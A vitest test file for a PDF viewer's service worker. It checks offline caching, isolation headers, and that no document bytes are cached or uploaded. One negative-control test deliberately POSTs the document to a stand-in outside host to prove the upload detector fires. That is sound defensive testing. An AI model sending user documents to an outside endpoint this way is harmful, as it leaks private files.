/**
 * The service worker, driven end to end against an in-memory Cache Storage
 * (SL-4.WEB.02).
 *
 * A service worker cannot register under `file://` and this package ships no
 * browser harness (ADR-P0021 keeps the JS tree dependency-free), so the worker
 * is tested by driving its real handlers with real `Request`/`Response` objects
 * and a Cache Storage double that implements the parts of the specification the
 * worker leans on: `addAll` atomicity, `match` honouring `Vary`, and `keys`
 * insertion order. What that does **not** prove is browser behaviour — see the
 * README's "Not proven in a browser" list.
 *
 * The three legs that matter, in order:
 * 1. Airplane mode: install, kill the network, load the shell and the WASM
 *    chunks. That is the DoD's "view, search, print" precondition.
 * 2. The document invariant: no path through a real intake leaves a document
 *    byte in either cache, including a document served from an allow-listed
 *    path and one whose Content-Type lies.
 * 3. The WEB.03 gate: with a service worker in the request path, the page's
 *    no-upload recorder still sees every request — the worker is downstream of
 *    the gate, and this is what proves it rather than asserting it.
 */

import { readFileSync, readdirSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";
import { runIntake } from "./handoff-flow.js";
import { ISOLATION_HEADERS, buildSecurityHeaders } from "./headers.js";
import { type RequestRecorder, installRequestRecorder } from "./no-upload.js";
import { OWNED_CACHES, PRECACHE_PATHS, RUNTIME_CACHE, SHELL_CACHE } from "./sw-policy.js";
import {
	type WorkerHandlers,
	createWorkerHandlers,
	isServiceWorkerScope,
	isSkipWaitingMessage,
	offlineFallback,
	requestFactsFrom,
	responseFactsFrom,
} from "./sw.js";

const pkgRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
const SCOPE = "https://viewer.selis.test/";

/** A document, and the fingerprints the gate would look for inside a request. */
const PDF = new TextEncoder().encode(
	"%PDF-1.7\nSelis WEB.02: a document that must never reach a cache.\n%%EOF\n",
);

function bufferOf(bytes: Uint8Array): ArrayBuffer {
	return bytes.slice().buffer as ArrayBuffer;
}

/** One request the origin actually saw. */
interface Logged {
	readonly url: string;
	readonly method: string;
	readonly range: string | null;
	readonly hasBody: boolean;
}

/** The origin side: routes, an on/off switch, and a log. */
interface Origin {
	readonly fetch: (request: Request) => Promise<Response>;
	readonly log: Logged[];
	readonly routes: Map<string, () => Response>;
	online: boolean;
	serve(path: string, make: () => Response): void;
}

const SHELL_HTML = "<!doctype html><title>Selis PDF Viewer</title><main id=selis-app>";

/** Headers the deployment sends for a shell navigation (WEB.01). */
function shellHeaders(extra: Record<string, string> = {}): Record<string, string> {
	return { ...buildSecurityHeaders(), ...extra };
}

function createOrigin(): Origin {
	const log: Logged[] = [];
	const routes = new Map<string, () => Response>();
	const origin: Origin = {
		log,
		routes,
		online: true,
		serve(path, make) {
			routes.set(path, make);
		},
		async fetch(request) {
			const url = new URL(request.url);
			log.push({
				url: request.url,
				method: request.method,
				range: request.headers.get("Range"),
				hasBody: request.body !== null,
			});
			if (!origin.online) {
				throw new TypeError("Failed to fetch: offline");
			}
			const route = routes.get(url.pathname);
			if (route === undefined) {
				return new Response("not found", { status: 404 });
			}
			return route();
		},
	};

	// The static deployment, as WEB.01 left it.
	origin.serve("/", () => new Response(SHELL_HTML, { headers: shellHeaders() }));
	origin.serve("/index.html", () => new Response(SHELL_HTML, { headers: shellHeaders() }));
	origin.serve(
		"/assets/style.css",
		() => new Response("body{}", { headers: { "Content-Type": "text/css" } }),
	);
	origin.serve(
		"/assets/boot.js",
		() => new Response("// boot", { headers: { "Content-Type": "text/javascript" } }),
	);
	origin.serve(
		"/wasm/selis_pdf_wasm.wasm",
		() =>
			new Response(new Uint8Array([0x00, 0x61, 0x73, 0x6d]), {
				headers: { "Content-Type": "application/wasm", "Content-Length": "4" },
			}),
	);
	return origin;
}

/** A stored response, kept as bytes so `match` can hand out a fresh `Response`. */
interface Stored {
	readonly request: Request;
	readonly status: number;
	readonly statusText: string;
	readonly headers: [string, string][];
	readonly body: ArrayBuffer;
}

async function snapshot(request: Request, response: Response): Promise<Stored> {
	return {
		request,
		status: response.status,
		statusText: response.statusText,
		headers: [...response.headers.entries()],
		body: await response.arrayBuffer(),
	};
}

function revive(entry: Stored): Response {
	return new Response(entry.body, {
		status: entry.status,
		statusText: entry.statusText,
		headers: entry.headers,
	});
}

/** One cache. Implements the specification behaviours the worker depends on. */
class FakeCache {
	entries: Stored[] = [];

	constructor(private readonly origin: Origin) {}

	/** Atomic, as the specification requires: one bad entry writes none. */
	async addAll(urls: readonly string[]): Promise<void> {
		const staged: Stored[] = [];
		for (const url of urls) {
			const request = new Request(new URL(url, SCOPE).href);
			const response = await this.origin.fetch(request);
			if (!response.ok) {
				throw new TypeError("addAll: one response was not ok");
			}
			staged.push(await snapshot(request, response));
		}
		this.entries.push(...staged);
	}

	async put(request: RequestInfo | string, response: Response): Promise<void> {
		const key = request instanceof Request ? request : new Request(new URL(request, SCOPE).href);
		this.entries.push(await snapshot(key, response));
	}

	async match(candidate: RequestInfo | string): Promise<Response | undefined> {
		const url = candidate instanceof Request ? candidate.url : new URL(candidate, SCOPE).href;
		const acceptEncoding =
			candidate instanceof Request ? candidate.headers.get("Accept-Encoding") : null;
		for (let i = this.entries.length - 1; i >= 0; i -= 1) {
			const entry = this.entries[i];
			if (entry === undefined || entry.request.url !== url) {
				continue;
			}
			// `Vary` is why the worker keys runtime entries by Request: an asset
			// that varies on Accept-Encoding must not be replayed to a client
			// that asked for a different encoding.
			const vary = entry.headers.find(([name]) => name.toLowerCase() === "vary")?.[1] ?? "";
			if (vary.includes("Accept-Encoding") && acceptEncoding !== null) {
				const stored = entry.request.headers.get("Accept-Encoding");
				if (stored !== acceptEncoding) {
					continue;
				}
			}
			return revive(entry);
		}
		return undefined;
	}

	async keys(): Promise<Request[]> {
		return this.entries.map((entry) => entry.request);
	}

	async delete(candidate: RequestInfo | string): Promise<boolean> {
		const url = candidate instanceof Request ? candidate.url : new URL(candidate, SCOPE).href;
		const before = this.entries.length;
		this.entries = this.entries.filter((entry) => entry.request.url !== url);
		return this.entries.length !== before;
	}

	urls(): string[] {
		return this.entries.map((entry) => entry.request.url);
	}
}

/** Cache Storage, minus the parts the worker never uses. */
class FakeCacheStorage {
	readonly opened = new Map<string, FakeCache>();

	constructor(private readonly origin: Origin) {}

	async open(name: string): Promise<FakeCache> {
		let cache = this.opened.get(name);
		if (cache === undefined) {
			cache = new FakeCache(this.origin);
			this.opened.set(name, cache);
		}
		return cache;
	}

	async keys(): Promise<string[]> {
		return [...this.opened.keys()];
	}

	async delete(name: string): Promise<boolean> {
		return this.opened.delete(name);
	}

	/** Every URL in every cache — the assertion the document legs are about. */
	storedUrls(): string[] {
		return [...this.opened.values()].flatMap((cache) => cache.urls());
	}
}

/**
 * A worker bound to a fresh origin.
 *
 * `workerIssued` is the log of what the **worker itself** fetched, kept apart
 * from the origin log of everything that arrived. The distinction is the whole
 * of one security argument: a request the page made is recorded by the page's
 * gate, while a request the worker made on its own initiative is recorded by
 * neither, so it has to be provable from the worker's own code.
 */
function createWorker(): {
	handlers: WorkerHandlers;
	caches: FakeCacheStorage;
	origin: Origin;
	workerIssued: Logged[];
} {
	const origin = createOrigin();
	const caches = new FakeCacheStorage(origin);
	const workerIssued: Logged[] = [];
	const handlers = createWorkerHandlers({
		caches: caches as unknown as CacheStorage,
		fetch: (request) => {
			workerIssued.push({
				url: request.url,
				method: request.method,
				range: request.headers.get("Range"),
				hasBody: request.body !== null,
			});
			return origin.fetch(request);
		},
		scopeUrl: SCOPE,
		clients: { claim: async () => undefined },
		skipWaiting: async () => undefined,
	});
	return { handlers, caches, origin, workerIssued };
}

/** `Request` cannot be built with `mode: "navigate"`, so the getter is replaced. */
function navigationRequest(url: string): Request {
	const request = new Request(url);
	Object.defineProperty(request, "mode", { value: "navigate" });
	return request;
}

/** Assert the worker accepted `request`, then answer it. A refusal is a failure here. */
async function respondTo(handlers: WorkerHandlers, request: Request): Promise<Response> {
	const decision = handlers.decide(request);
	if (!decision.respond) {
		throw new Error(`expected a cacheable request, got a passthrough: ${request.url}`);
	}
	return handlers.respond(request, decision);
}
/** The `fetch` event, as the wiring performs it: decide, then maybe respond. */
async function dispatch(handlers: WorkerHandlers, request: Request): Promise<Response | "browser"> {
	const decision = handlers.decide(request);
	if (!decision.respond) {
		return "browser";
	}
	return handlers.respond(request, decision);
}
describe("install: the shell, and only the shell", () => {
	it("precaches PRECACHE_PATHS into the shell cache and touches no runtime cache", async () => {
		const { handlers, caches } = createWorker();
		await handlers.install();
		const shell = await caches.open(SHELL_CACHE);
		expect(shell.urls().sort()).toEqual(
			[...PRECACHE_PATHS].map((path) => new URL(path, SCOPE).href).sort(),
		);
		expect(caches.opened.has(RUNTIME_CACHE)).toBe(false);
	});

	it("is atomic: one missing asset fails the install and caches nothing", async () => {
		const { handlers, caches, origin } = createWorker();
		origin.serve("/assets/style.css", () => new Response("gone", { status: 404 }));
		await expect(handlers.install()).rejects.toThrow();
		const shell = await caches.open(SHELL_CACHE);
		expect(shell.urls()).toHaveLength(0);
	});

	it("issues only bodyless GETs of allow-listed URLs - never a document", async () => {
		const { handlers, origin } = createWorker();
		await handlers.install();
		expect(origin.log.map((entry) => new URL(entry.url).pathname).sort()).toEqual(
			[...PRECACHE_PATHS].sort(),
		);
		for (const entry of origin.log) {
			expect(entry.method).toBe("GET");
			expect(entry.hasBody).toBe(false);
			expect(entry.range).toBeNull();
		}
	});
});

describe("activate: a version boundary, not a wipe", () => {
	it("deletes our own previous versions and leaves other caches alone", async () => {
		const { handlers, caches } = createWorker();
		await caches.open("selis-shell-v0");
		await caches.open("selis-runtime-v0");
		await caches.open("some-other-app-v3");
		await handlers.install();
		await handlers.activate();
		// The runtime cache is created lazily, on the first asset the worker is
		// asked to remember, so after a precache-only install the names left are
		// the current shell plus the foreign cache.
		expect((await caches.keys()).sort()).toEqual([SHELL_CACHE, "some-other-app-v3"].sort());
		expect(OWNED_CACHES).toContain(SHELL_CACHE);
	});
});

describe("airplane mode: the DoD's precondition", () => {
	it("serves the shell from cache with the network dead", async () => {
		const { handlers, origin } = createWorker();
		await handlers.install();
		origin.online = false;
		const served = await dispatch(handlers, navigationRequest(SCOPE));
		expect(served).not.toBe("browser");
		if (served === "browser") {
			return;
		}
		expect(served.status).toBe(200);
		expect(await served.text()).toContain("Selis PDF Viewer");
	});

	it("serves a WASM chunk it fetched earlier, offline", async () => {
		const { handlers, origin } = createWorker();
		const first = await dispatch(handlers, new Request(`${SCOPE}wasm/selis_pdf_wasm.wasm`));
		expect(first).not.toBe("browser");
		origin.online = false;
		const second = await dispatch(handlers, new Request(`${SCOPE}wasm/selis_pdf_wasm.wasm`));
		expect(second).not.toBe("browser");
		if (second === "browser") {
			return;
		}
		expect(second.status).toBe(200);
		expect(new Uint8Array(await second.arrayBuffer())).toEqual(
			new Uint8Array([0x00, 0x61, 0x73, 0x6d]),
		);
		// And it came from the cache, not from an origin that is now unreachable.
		expect(origin.log.filter((entry) => entry.url.endsWith(".wasm"))).toHaveLength(1);
	});

	it("resolves /index.html through the shell alias when the host routes it apart", async () => {
		const { handlers, origin } = createWorker();
		await handlers.install();
		origin.online = false;
		const served = await dispatch(handlers, navigationRequest(`${SCOPE}index.html`));
		if (served === "browser") {
			throw new Error("a navigation must never be passed through");
		}
		expect(await served.text()).toContain("Selis PDF Viewer");
	});

	it("answers with an honest 503 when the shell is not installed and there is no network", async () => {
		const { handlers, origin } = createWorker();
		origin.online = false;
		const served = await dispatch(handlers, navigationRequest(SCOPE));
		if (served === "browser") {
			throw new Error("a navigation must never be passed through");
		}
		expect(served.status).toBe(503);
		expect(served.headers.get("Cache-Control")).toBe("no-store");
		expect(await served.text()).toContain("Not available offline yet");
	});
});

describe("COOP/COEP survive the cache (WEB.01 inherited)", () => {
	it("serves the navigation with every header the origin sent, isolation included", async () => {
		const { handlers, origin } = createWorker();
		await handlers.install();
		const live = await origin.fetch(new Request(SCOPE));
		origin.online = false;
		const served = await dispatch(handlers, navigationRequest(SCOPE));
		if (served === "browser") {
			throw new Error("a navigation must never be passed through");
		}
		for (const [name, value] of live.headers.entries()) {
			expect(served.headers.get(name), name).toBe(value);
		}
	});

	it("still reads as cross-origin isolated, so the threaded path survives offline", async () => {
		const { handlers, origin } = createWorker();
		await handlers.install();
		origin.online = false;
		const served = await dispatch(handlers, navigationRequest(SCOPE));
		if (served === "browser") {
			throw new Error("a navigation must never be passed through");
		}
		expect(served.headers.get("Cross-Origin-Opener-Policy")).toBe(
			ISOLATION_HEADERS["Cross-Origin-Opener-Policy"],
		);
		expect(served.headers.get("Cross-Origin-Embedder-Policy")).toBe(
			ISOLATION_HEADERS["Cross-Origin-Embedder-Policy"],
		);
	});

	it("puts the isolation headers on the synthesised offline response too", () => {
		const fallback = offlineFallback();
		expect(fallback.headers.get("Cross-Origin-Opener-Policy")).toBe("same-origin");
		expect(fallback.headers.get("Cross-Origin-Embedder-Policy")).toBe("require-corp");
		expect(fallback.headers.get("Cross-Origin-Resource-Policy")).toBe("same-origin");
	});
});
describe("a document is never cached (the crux)", () => {
	it("caches nothing from a real ?src= open, chunk by chunk", async () => {
		const { handlers, caches, origin } = createWorker();
		await handlers.install();
		// A same-origin document origin that honours Range, as WEB.03 expects.
		origin.serve(
			"/report.pdf",
			() =>
				new Response(bufferOf(PDF), {
					headers: { "Content-Type": "application/pdf", "Content-Length": String(PDF.length) },
				}),
		);
		const seen: string[] = [];
		const result = await runIntake(
			{ path: "url", href: `${SCOPE}?src=${encodeURIComponent(`${SCOPE}report.pdf`)}` },
			{
				fetch: async (input, init) => {
					const request = new Request(String(input), init);
					seen.push(request.url);
					const decision = handlers.decide(request);
					// Every one of these must be declined: the worker never sees a
					// document, not even to answer it from a cache.
					expect(decision.respond, request.url).toBe(false);
					return origin.fetch(request);
				},
			},
		);
		expect(result.ok).toBe(true);
		expect(seen.length).toBeGreaterThan(0);
		for (const url of seen) {
			expect(url).toContain("/report.pdf");
		}
		expect(caches.storedUrls().filter((url) => url.includes("report.pdf"))).toHaveLength(0);
		expect(await caches.open(RUNTIME_CACHE).then((cache) => cache.urls())).toHaveLength(0);
	});

	it("refuses a document served from an allow-listed path, by content type", async () => {
		const { handlers, caches, origin } = createWorker();
		// The nastiest shape: a document behind a path the allow-list accepts.
		origin.serve(
			"/assets/report.pdf",
			() => new Response(bufferOf(PDF), { headers: { "Content-Type": "application/pdf" } }),
		);
		const request = new Request(`${SCOPE}assets/report.pdf`);
		expect(handlers.decide(request).kind).toBe("runtime");
		const served = await respondTo(handlers, request);
		expect(await served.text()).toContain("%PDF-1.7");
		expect((await caches.open(RUNTIME_CACHE)).urls()).toHaveLength(0);
	});

	it("refuses a document whose origin mislabels it, in every shape", async () => {
		const { handlers, caches, origin } = createWorker();
		const shapes: Record<string, string> = {
			"/assets/a.wasm": "application/octet-stream",
			"/assets/b.wasm": "text/plain",
			"/assets/c.wasm": "application/pdf",
			"/assets/d.wasm": "text/html",
			"/assets/e.wasm": "application/wasm",
		};
		for (const [path, contentType] of Object.entries(shapes)) {
			origin.serve(
				path,
				() => new Response(bufferOf(PDF), { headers: { "Content-Type": contentType } }),
			);
		}
		for (const path of Object.keys(shapes)) {
			const request = new Request(`${SCOPE}${path.slice(1)}`);
			await respondTo(handlers, request);
		}
		// Even the entry that claimed to be a WASM module: the content-type
		// allow-list is not the only gate, and a PDF served as `application/wasm`
		// under `/assets/` is the shape a caching bug would take.
		expect((await caches.open(RUNTIME_CACHE)).urls()).toEqual([`${SCOPE}assets/e.wasm`]);
	});

	it("never serves a document from either cache, even if one appeared", async () => {
		const { handlers, caches, origin } = createWorker();
		await handlers.install();
		// Planted violation: a document forced into the runtime cache by hand,
		// bypassing the policy. The worker must still not hand it back for a
		// document request - though note it *will* serve it for the allow-listed
		// asset URL it was planted under, which is the documented limit of a
		// cache-first asset cache.
		const shell = await caches.open(RUNTIME_CACHE);
		await shell.put(
			new Request(`${SCOPE}assets/planted.wasm`),
			new Response(bufferOf(PDF), { headers: { "Content-Type": "application/wasm" } }),
		);
		origin.online = false;
		const documentRequest = new Request(`${SCOPE}assets/planted.wasm`, {
			headers: { Range: "bytes=0-10" },
		});
		expect(handlers.decide(documentRequest).respond).toBe(false);
		const navigation = await dispatch(handlers, navigationRequest(SCOPE));
		if (navigation === "browser") {
			throw new Error("a navigation must never be passed through");
		}
		expect(await navigation.text()).not.toContain("%PDF-1.7");
	});
});

describe("the SW does not bypass the WEB.03 gate", () => {
	const realFetch = globalThis.fetch;
	let recorder: RequestRecorder | null = null;

	afterEach(() => {
		recorder?.restore();
		recorder = null;
		globalThis.fetch = realFetch;
	});

	/**
	 * Wire the page's `fetch` exactly as the browser does: the page's wrapper
	 * (the gate) is outermost, and the service worker sits *inside* it, on the
	 * way to the origin. `globalThis.fetch` is therefore the SW dispatch, and
	 * `installRequestRecorder` wraps that.
	 */
	function installWorkerBehindTheGate(worker: ReturnType<typeof createWorker>): void {
		const { handlers, origin } = worker;
		globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
			const request = new Request(input as RequestInfo, init);
			const decision = handlers.decide(request);
			if (!decision.respond) {
				return origin.fetch(request);
			}
			return handlers.respond(request, decision);
		}) as typeof fetch;
		recorder = installRequestRecorder();
	}

	it("still records every request the page makes with a worker in the path", async () => {
		const worker = createWorker();
		await worker.handlers.install();
		worker.origin.serve(
			"/report.pdf",
			() => new Response(bufferOf(PDF), { headers: { "Content-Type": "application/pdf" } }),
		);
		installWorkerBehindTheGate(worker);
		const result = await runIntake({
			path: "url",
			href: `${SCOPE}?src=${encodeURIComponent(`${SCOPE}report.pdf`)}`,
		});
		expect(result.ok).toBe(true);
		const recorded = await recorder?.settle();
		// Non-vacuous: the gate saw the requests, and none of them uploaded.
		expect(recorded?.length ?? 0).toBeGreaterThan(0);
		for (const request of recorded ?? []) {
			expect(request.method).toBe("GET");
			expect(request.body).toBeNull();
		}
		await recorder?.assertNoUpload([PDF]);
		expect(worker.caches.storedUrls().filter((url) => url.includes("report.pdf"))).toHaveLength(0);
	});

	it("has a non-vacuous gate: a planted upload through the same path is caught", async () => {
		const worker = createWorker();
		await worker.handlers.install();
		installWorkerBehindTheGate(worker);
		// The negative control. Without it, a recorder that recorded nothing would
		// pass the leg above.
		await fetch("https://elsewhere.test/collect", { method: "POST", body: bufferOf(PDF) });
		await expect(recorder?.assertNoUpload([PDF])).rejects.toThrow(/upload detected/);
	});

	it("issues no request of its own while a document session runs", async () => {
		const worker = createWorker();
		await worker.handlers.install();
		worker.origin.serve(
			"/report.pdf",
			() => new Response(bufferOf(PDF), { headers: { "Content-Type": "application/pdf" } }),
		);
		installWorkerBehindTheGate(worker);
		const before = worker.workerIssued.length;
		await runIntake({
			path: "url",
			href: `${SCOPE}?src=${encodeURIComponent(`${SCOPE}report.pdf`)}`,
		});
		const during = worker.workerIssued.slice(before);
		// A prefetch, or any other request the worker originates, is the one hole
		// the page's gate cannot see, because it happens outside the page.
		// There is nothing: the document was fetched by the page, and the worker
		// fetched nothing at all while the document was open.
		expect(during).toHaveLength(0);
		// What the install did fetch is exactly the shell, all of it a bodyless GET.
		for (const entry of worker.workerIssued) {
			expect(PRECACHE_PATHS).toContain(new URL(entry.url).pathname);
			expect(entry.method).toBe("GET");
			expect(entry.hasBody).toBe(false);
		}
	});
});

describe("the cache allow-list is structural", () => {
	it("declines cross-origin and document requests without touching a cache", async () => {
		const { handlers, caches, origin } = createWorker();
		await handlers.install();
		const requests = [
			new Request("https://elsewhere.test/report.pdf"),
			new Request(`${SCOPE}report.pdf`),
			new Request(`${SCOPE}?src=https%3A%2F%2Fx.test%2Fa.pdf`),
			new Request(`${SCOPE}report.pdf`, { headers: { Range: "bytes=0-10" } }),
			new Request(`${SCOPE}api/document`),
		];
		for (const request of requests) {
			expect(await dispatch(handlers, request), request.url).toBe("browser");
		}
		// Only the shell install is in there; nothing above was stored.
		expect(caches.storedUrls().sort()).toEqual(
			[...PRECACHE_PATHS].map((path) => new URL(path, SCOPE).href).sort(),
		);
		origin.online = false;
	});

	it("has exactly two cache-write call sites in the package", () => {
		// A third `put`/`addAll` is a third way to persist a document, so the
		// count is asserted against the sources rather than trusted.
		const srcDir = join(pkgRoot, "src");
		const sources = readdirSync(srcDir).filter(
			(name) => name.endsWith(".ts") && !name.endsWith(".test.ts"),
		);
		let puts = 0;
		let addAlls = 0;
		for (const name of sources) {
			const text = readFileSync(join(srcDir, name), "utf8");
			puts += (text.match(/\.put\(/g) ?? []).length;
			addAlls += (text.match(/\.addAll\(/g) ?? []).length;
		}
		expect(puts, "cache write call sites").toBe(1);
		expect(addAlls, "cache write call sites").toBe(1);
	});

	it("precaches only files that exist in public/, so install cannot fail at deploy", () => {
		for (const path of PRECACHE_PATHS) {
			const relative = path === "/" ? "index.html" : path.replace(/^\//, "");
			expect(() => readFileSync(join(pkgRoot, "public", relative)), path).not.toThrow();
		}
	});
});

describe("runtime cache behaviour", () => {
	it("honours Vary: a brotli client and a gzip client are not served each other's bytes", async () => {
		const { handlers, origin } = createWorker();
		origin.serve(
			"/assets/mod.wasm",
			() =>
				new Response(new Uint8Array([1, 2, 3]), {
					headers: { "Content-Type": "application/wasm", Vary: "Accept-Encoding" },
				}),
		);
		const brotli = new Request(`${SCOPE}assets/mod.wasm`, { headers: { "Accept-Encoding": "br" } });
		const gzip = new Request(`${SCOPE}assets/mod.wasm`, { headers: { "Accept-Encoding": "gzip" } });
		await respondTo(handlers, brotli);
		const miss = await respondTo(handlers, gzip);
		expect(miss.status).toBe(200);
		expect(origin.log.filter((entry) => entry.url.endsWith("mod.wasm"))).toHaveLength(2);
		const brotliHit = await respondTo(handlers, brotli);
		expect(brotliHit.status).toBe(200);
		expect(origin.log.filter((entry) => entry.url.endsWith("mod.wasm"))).toHaveLength(2);
	});

	it("still serves an asset it declines to store", async () => {
		const { handlers, origin } = createWorker();
		origin.serve(
			"/assets/huge.wasm",
			() =>
				new Response(new Uint8Array([1]), {
					headers: { "Content-Type": "application/wasm", "Cache-Control": "no-store" },
				}),
		);
		const request = new Request(`${SCOPE}assets/huge.wasm`);
		const served = await respondTo(handlers, request);
		expect(served.status).toBe(200);
		const cache = await (await createWorker()).caches.open(RUNTIME_CACHE);
		expect(cache.urls()).toHaveLength(0);
	});
});

describe("module-level wiring", () => {
	it("does nothing on import in a non-worker scope (Node, a window)", () => {
		// The import above already ran `isServiceWorkerScope(globalThis)`; a
		// module that wired on import would have thrown here.
		expect(isServiceWorkerScope(globalThis)).toBe(false);
		expect(isServiceWorkerScope({ skipWaiting: () => undefined, caches: {} })).toBe(true);
		expect(isServiceWorkerScope({})).toBe(false);
		expect(isServiceWorkerScope(null)).toBe(false);
	});

	it("recognises only the skip-waiting message", () => {
		expect(isSkipWaitingMessage({ type: "selis:skip-waiting" })).toBe(true);
		expect(isSkipWaitingMessage({ type: "something-else" })).toBe(false);
		expect(isSkipWaitingMessage(null)).toBe(false);
		expect(isSkipWaitingMessage("selis:skip-waiting")).toBe(false);
	});

	it("reads request and response facts off real platform objects", () => {
		const request = new Request(`${SCOPE}assets/a.js`, { headers: { Range: "bytes=0-1" } });
		expect(requestFactsFrom(request, SCOPE)).toEqual({
			url: `${SCOPE}assets/a.js`,
			method: "GET",
			mode: request.mode,
			scopeUrl: SCOPE,
			rangeHeader: "bytes=0-1",
			hasBody: false,
		});
		const response = new Response("x", {
			headers: { "Content-Type": "application/wasm", "Content-Length": "1" },
		});
		expect(responseFactsFrom(response).contentType).toBe("application/wasm");
		expect(responseFactsFrom(response).contentLength).toBe(1);
		expect(responseFactsFrom(new Response("x")).contentLength).toBeNull();
	});
});
